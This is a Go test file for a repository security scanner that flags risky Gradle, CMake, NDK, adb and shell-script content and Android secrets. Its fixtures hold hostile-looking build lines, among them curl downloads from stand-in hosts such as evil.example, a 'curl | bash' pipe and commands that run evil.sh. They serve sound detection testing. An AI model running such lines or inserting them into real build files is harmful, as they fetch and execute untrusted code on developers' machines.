package scan

import (
	"path/filepath"
	"strings"
	"testing"
)

// TestDetectorsAreIndependent checks every detector runs and that a target with
// none of a detector's files produces nothing from it. Each detector owns its
// own files, so one must never depend on another's.
func TestDetectorSkipsTargetWithoutItsFiles(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")

	repo, err := discoverRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	var findings []Finding
	add := func(f Finding) { findings = append(findings, f) }
	for _, d := range detectors {
		if err := d(repo, add); err != nil {
			t.Fatalf("detector on a clean repo: %v", err)
		}
	}
	if len(findings) != 0 {
		t.Errorf("clean repo findings = %+v, want none", findings)
	}
}

func TestGradleScriptRunsCommand(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "app", "build.gradle"),
		"android { buildTypes { debug { } } }\n")

	if findings := scan(t, root); hasTitlePrefix(findings, "Gradle script") {
		t.Errorf("plain build.gradle should be clean, got %v", titles(findings))
	}

	writeFile(t, filepath.Join(root, "app", "build.gradle"),
		"task install { exec { commandLine 'sh', 'evil.sh' } }\n")
	if findings := scan(t, root); !hasTitlePrefix(findings, "Gradle script runs a command") {
		t.Errorf("exec in build.gradle not found: %+v", findings)
	}
}

func TestGradleScriptDownloadsAFile(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "build.gradle.kts"),
		"val s = \"curl http://evil.sh\"\n")

	if findings := scan(t, root); !hasTitlePrefix(findings, "Gradle script downloads a file") {
		t.Errorf("curl in a Gradle script not found: %+v", findings)
	}
}

// TestGradleBuildScriptIsNotAFinding checks the tokens that every Android
// project contains are not reported. The lines here are copied from Google's
// Now in Android, which side-eye used to report as one critical and three high
// findings. `configuration("...RuntimeClasspath")`, a buildConfigField with a
// plain URL, a KDoc comment about the classpath, and `apply false` are all
// ordinary, and flagging them makes the scan useless on a real project.
func TestGradleBuildScriptIsNotAFinding(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "build.gradle.kts"), `/*
 * ensures that the build script classpath remains the same for all projects.
 * an unlisted plugin will have that plugin and its dependencies _appended_ to
 * the classpath, not resolved from it.
 */
plugins {
    alias(libs.plugins.android.application) apply false
    alias(libs.plugins.android.library) apply false
}
dependencies {
    add("prodReleaseRuntimeClasspath", libs.androidx.core)
}
`)
	writeFile(t, filepath.Join(root, "core", "network", "build.gradle.kts"), `val backendUrl = providers
    .gradleProperty("backendUrl")
    .orElse("http://example.com")
`)

	if findings := scan(t, root); len(findings) != 0 {
		t.Errorf("ordinary build scripts flagged: %v", titles(findings))
	}
}

// TestGradleScriptStillCatchesAnExploit checks the fixes did not blunt the
// detector. Comments come out before matching, so the payload has to be in
// code for it to be found.
func TestGradleScriptStillCatchesAnExploit(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "build.gradle.kts"), `// the classpath stays pinned
plugins {
    alias(libs.plugins.android.application) apply false
}
val payload = "curl http://evil.example/p.sh"
`)

	if findings := scan(t, root); !hasTitlePrefix(findings, "Gradle script downloads a file") {
		t.Errorf("curl in code not found after the comment and boundary fixes: %v", titles(findings))
	}
}

func TestStripGradleCommentsKeepsStrings(t *testing.T) {
	got := string(stripGradleComments([]byte(`val a = "http://x // not a comment" // gone
/* gone */ val b = 1`)))
	for _, want := range []string{`"http://x // not a comment"`, "val b = 1"} {
		if !strings.Contains(got, want) {
			t.Errorf("stripGradleComments = %q, want it to keep %q", got, want)
		}
	}
	for _, gone := range []string{"gone"} {
		if strings.Contains(got, gone) {
			t.Errorf("stripGradleComments = %q, want %q removed", got, gone)
		}
	}
}

// TestContainsWordBoundary checks the matching that keeps RuntimeClasspath from
// matching classpath.
func TestContainsWordBoundary(t *testing.T) {
	cases := []struct {
		text, token string
		want        bool
	}{
		{`configuration("prodReleaseRuntimeClasspath")`, "classpath(", false},
		{"the build script classpath remains the same", "classpath(", false},
		{`classpath("com.evil:plugin:1.0")`, "classpath(", true},
		{"alias(libs.plugins) apply false", "apply(", false},
		{`apply(from = "other.gradle.kts")`, "apply(from", true},
		{"runtime.getruntime().exec(cmd)", "runtime.getruntime", true},
		{"myruntime.getruntime()", "runtime.getruntime", false},
	}
	for _, c := range cases {
		if got := containsWord(c.text, c.token); got != c.want {
			t.Errorf("containsWord(%q, %q) = %v, want %v", c.text, c.token, got, c.want)
		}
	}
}

func TestGradleWrapperHost(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "gradle", "wrapper", "gradle-wrapper.properties"),
		"distributionUrl=https\\://services.gradle.org/distributions/gradle-8.7-bin.zip\n")
	if findings := scan(t, root); hasTitlePrefix(findings, "Gradle wrapper downloads from another host") {
		t.Errorf("official Gradle host flagged: %+v", findings)
	}

	writeFile(t, filepath.Join(root, "gradle", "wrapper", "gradle-wrapper.properties"),
		"distributionUrl=https\\://gradle.example.com/gradle-8.7-bin.zip\n")
	if findings := scan(t, root); !hasTitle(findings, "Gradle wrapper downloads from another host") {
		t.Errorf("other host not flagged: %+v", findings)
	}
}

func TestAndroidSecretsAndKeys(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "gradle.properties"), "storePassword=hunter2\n")
	writeFile(t, filepath.Join(root, "local.properties"), "sdk.dir=/Users/me/Android/Sdk\n")
	writeFile(t, filepath.Join(root, "release.jks"), "binary")

	findings := scan(t, root)
	for _, want := range []string{
		"Gradle property looks like a secret: storepassword",
		"local.properties present",
		"Signing key in the tree",
	} {
		if !hasTitle(findings, want) {
			t.Errorf("missing %q in %+v", want, titles(findings))
		}
	}
}

func TestCMakeAndNDKCommands(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "src", "main", "cpp", "CMakeLists.txt"),
		"execute_process(COMMAND sh -c evil.sh)\n")
	writeFile(t, filepath.Join(root, "src", "main", "jni", "Android.mk"),
		"LOCAL_LDFLAGS := $(shell id)\n")

	findings := scan(t, root)
	if !hasTitlePrefix(findings, "CMake runs a command") {
		t.Errorf("execute_process not found: %+v", findings)
	}
	if !hasTitlePrefix(findings, "NDK build file runs a command") {
		t.Errorf("$(shell in Android.mk not found: %+v", findings)
	}
}

func TestADBRunsOnDevice(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, ".vscode", "tasks.json"),
		`{"tasks":[{"label":"install","command":"adb install -r app.apk"}]}`)

	if findings := scan(t, root); !hasTitlePrefix(findings, "adb runs on a device") {
		t.Errorf("adb install not found: %+v", findings)
	}
}

func TestShellScriptPipesIntoInterpreter(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "scripts", "setup.sh"), "curl -sL http://x | bash\n")

	findings := scan(t, root)
	if !hasTitlePrefix(findings, "Setup script pipes into an interpreter") {
		t.Errorf("pipe to bash not found: %+v", findings)
	}
	if hasTitlePrefix(findings, "Setup script downloads a file") {
		t.Errorf("the pipe finding should replace the download finding: %+v", findings)
	}
}

func TestCleanShellScriptIsQuiet(t *testing.T) {
	root := makeRepo(t, "[core]\n")
	writeFile(t, filepath.Join(root, "scripts", "build.sh"), "#!/bin/sh\ngo build ./...\n")

	if findings := scan(t, root); len(findings) != 0 {
		t.Errorf("clean script findings = %+v, want none", findings)
	}
}

func titles(findings []Finding) []string {
	out := make([]string, 0, len(findings))
	for _, f := range findings {
		out = append(out, f.Title)
	}
	return out
}
